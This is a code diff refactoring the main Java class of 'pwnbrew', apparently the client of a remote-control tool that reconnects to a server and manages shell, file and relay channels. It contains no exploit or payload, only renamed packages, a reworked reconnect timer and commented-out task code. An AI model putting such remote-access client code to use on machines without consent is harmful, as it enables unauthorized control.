@@ -47,10 +47,12 @@ import pwnbrew.log.RemoteLog;
 import pwnbrew.log.LoggableException;
 import pwnbrew.manager.PortManager;
 import pwnbrew.manager.DataManager;
-import pwnbrew.misc.Constants;
-import pwnbrew.misc.DebugPrinter;
-import pwnbrew.misc.ReconnectTimer;
-import pwnbrew.misc.Utilities;
+import pwnbrew.manager.OutgoingConnectionManager;
+import pwnbrew.utilities.Constants;
+import pwnbrew.utilities.DebugPrinter;
+import pwnbrew.utilities.ReconnectTimer;
+import pwnbrew.utilities.Utilities;
+import pwnbrew.network.ClientPortRouter;
 import pwnbrew.network.control.ControlMessageManager;
 import pwnbrew.network.control.messages.TaskStatus;
 import pwnbrew.network.file.FileMessageManager;
@@ -59,7 +61,6 @@ import pwnbrew.network.http.Http;
 import pwnbrew.network.relay.RelayManager;
 import pwnbrew.network.shell.ShellMessageManager;
 import pwnbrew.task.TaskListener;
-//import pwnbrew.task.TaskRunner;
 
 
 /**
@@ -71,8 +72,6 @@ public final class Pwnbrew extends PortManager implements TaskListener {
     private static final String NAME_Class = Pwnbrew.class.getSimpleName();
     private static final boolean debug = true;
   
-    //The Server Details
-//    private final Map<Integer, TaskRunner> theTaskMap = new HashMap<>();
      
     //===============================================================
     /**
@@ -110,12 +109,17 @@ public final class Pwnbrew extends PortManager implements TaskListener {
     */
     private void start() throws UnknownHostException, LoggableException {
 
-        //Try and connect to the server
-        ReconnectTimer aReconnectTimer = ReconnectTimer.getReconnectTimer();        
+        //Create the Timer
+        ReconnectTimer aReconnectTimer = new ReconnectTimer(OutgoingConnectionManager.COMM_CHANNEL_ID); 
         
+        //Start the timer
         aReconnectTimer.setCommManager( this );
         aReconnectTimer.start();
-
+            
+        //Try and connect to the server
+        int thePort = ClientConfig.getConfig().getSocketPort();
+        ClientPortRouter aPR = (ClientPortRouter) getPortRouter( thePort );
+        
     }
      
     //===============================================================
@@ -130,13 +134,6 @@ public final class Pwnbrew extends PortManager implements TaskListener {
         try {
             
             super.shutdown();
-
-//            //Shutdown the task runners
-//            synchronized(theTaskMap){
-//                for( TaskRunner aRunner : theTaskMap.values()){
-//                    aRunner.shutdown();
-//                }
-//            }       
 
             //Shutdown the managers
             ControlMessageManager aCMM = ControlMessageManager.getControlMessageManager();
@@ -158,9 +155,6 @@ public final class Pwnbrew extends PortManager implements TaskListener {
             if( theRelayManager != null ){
                 theRelayManager.shutdown();
             }
-            
-            //Shut down reconnect timer if it's running
-            ReconnectTimer.getReconnectTimer().shutdown();
 
             //Shutdown debugger
             DebugPrinter.shutdown();
@@ -173,27 +167,18 @@ public final class Pwnbrew extends PortManager implements TaskListener {
         }
     }
 
-    //===============================================================
-     /**
-     * Notifies the task handler that a file was successfully sent
-     *
-     * @param taskId the task id
-     * @param fileOp the kind of file notification
-      *
-    */
-    @Override
-    public void notifyHandler( int taskId, int fileOp ) {
-
-//       TaskRunner theTaskRunner;
-//       synchronized(theTaskMap){
-//          theTaskRunner = theTaskMap.get(taskId);
-//       }
+//    //===============================================================
+//     /**
+//     * Notifies the task handler that a file was successfully sent
+//     *
+//     * @param taskId the task id
+//     * @param fileOp the kind of file notification
+//      *
+//    */
+//    @Override
+//    public void notifyHandler( int taskId, int fileOp ) {
 //
-//       //Notify the task runner thread
-//       if(theTaskRunner != null){
-//          theTaskRunner.notifyFileOp(fileOp);
-//       }
-    }
+//    }
 
      /**
      * @param args the command line arguments
@@ -258,41 +243,16 @@ public final class Pwnbrew extends PortManager implements TaskListener {
         } catch (Throwable ex) {
            
             ex.printStackTrace();
+          
+            //Try to send the remote log first
+            RemoteLog.log(Level.WARNING, NAME_Class, "main()", ex.getMessage(), ex);
             DebugPrinter.shutdown();
             Constants.Executor.shutdownNow();
-            RemoteLog.log(Level.WARNING, NAME_Class, "main()", ex.getMessage(), ex);
             throw ex;
            
         } 
 
     }
-
-//    //===============================================================
-//    /**
-//     * Adds a task runner to the map
-//     *
-//     * @param passedId
-//     * @param passedRunner
-//    */
-//    private TaskRunner addTaskRunner(Integer passedId, TaskRunner passedRunner){
-//        synchronized(theTaskMap){
-//           return theTaskMap.put(passedId, passedRunner);
-//        }
-//    }
-
-//    //===============================================================
-//    /**
-//     * Returns the task handler for the specified id
-//     *
-//     * @param passedId
-//    */
-//    private TaskRunner getTaskRunner(Integer passedId){
-//        TaskRunner theTaskRunner;
-//        synchronized(theTaskMap){
-//           theTaskRunner = theTaskMap.get(passedId);
-//        }
-//        return theTaskRunner;
-//    }
 
     //===============================================================
     /**
@@ -305,29 +265,7 @@ public final class Pwnbrew extends PortManager implements TaskListener {
         int taskId = passedMsg.getTaskId();
 
         String taskStatus = passedMsg.getStatus();
-//        if(taskStatus.equals( TaskStatus.TASK_START) && passedMsg instanceof TaskNew){
-//
-//            TaskRunner theTaskRunner = getTaskRunner(Integer.valueOf(taskId));
-//            if( theTaskRunner == null){
-//                
-//                //Create a new task runner, add it to the map, and execute it
-//                TaskNew newTask = (TaskNew)passedMsg;
-//                TaskRunner aHandler = new TaskRunner(this, newTask);
-//                addTaskRunner(taskId, aHandler);
-//
-//                //Execute the runnable
-//                aHandler.start();
-//            }
-//
-//        //If a msg was received to cancel the task
-//        } else 
         if (taskStatus.equals( TaskStatus.TASK_CANCELLED)){
-
-//            TaskRunner theTaskRunner = getTaskRunner(Integer.valueOf(taskId));
-//            //Shutdown the runner
-//            if(theTaskRunner != null){
-//                theTaskRunner.shutdown();
-//            }
             
             //Get the file manager
             try {
@@ -342,41 +280,39 @@ public final class Pwnbrew extends PortManager implements TaskListener {
                 RemoteLog.log(Level.WARNING, NAME_Class, "taskChanged()", ex.getMessage(), ex);
             }
             
-            
-           
         }
 
     }
 
-    //===============================================================
-    /**
-     * Handles the completion of a task
-     *
-     * @param taskId
-     * @param resultStatus
-    */
-    @Override
-    public void taskFinished(Integer taskId, String resultStatus ) {
-        
-     
-        //Send out task fin
-        DebugPrinter.printMessage( this.getClass().getSimpleName(), "Sent task finish for " + taskId);
-
-        try {
-            
-            ControlMessageManager aCMManager = ControlMessageManager.getControlMessageManager();
-            if( aCMManager == null ){
-                aCMManager = ControlMessageManager.initialize( this );
-            }
-            
-            TaskStatus finMessage = new TaskStatus( taskId, resultStatus );
-            aCMManager.send(finMessage);
-            
-        } catch (IOException | LoggableException ex ){
-           RemoteLog.log(Level.SEVERE, NAME_Class, "taskFinished()", ex.getMessage(), ex);
-        }
-
-    }
+//    //===============================================================
+//    /**
+//     * Handles the completion of a task
+//     *
+//     * @param taskId
+//     * @param resultStatus
+//    */
+//    @Override
+//    public void taskFinished(Integer taskId, String resultStatus ) {
+//        
+//     
+//        //Send out task fin
+//        DebugPrinter.printMessage( this.getClass().getSimpleName(), "Sent task finish for " + taskId);
+//
+//        try {
+//            
+//            ControlMessageManager aCMManager = ControlMessageManager.getControlMessageManager();
+//            if( aCMManager == null ){
+//                aCMManager = ControlMessageManager.initialize( this );
+//            }
+//            
+//            TaskStatus finMessage = new TaskStatus( taskId, resultStatus );
+//            aCMManager.send(finMessage);
+//            
+//        } catch (IOException | LoggableException ex ){
+//           RemoteLog.log(Level.SEVERE, NAME_Class, "taskFinished()", ex.getMessage(), ex);
+//        }
+//
+//    }
 
     //===============================================================
     /**
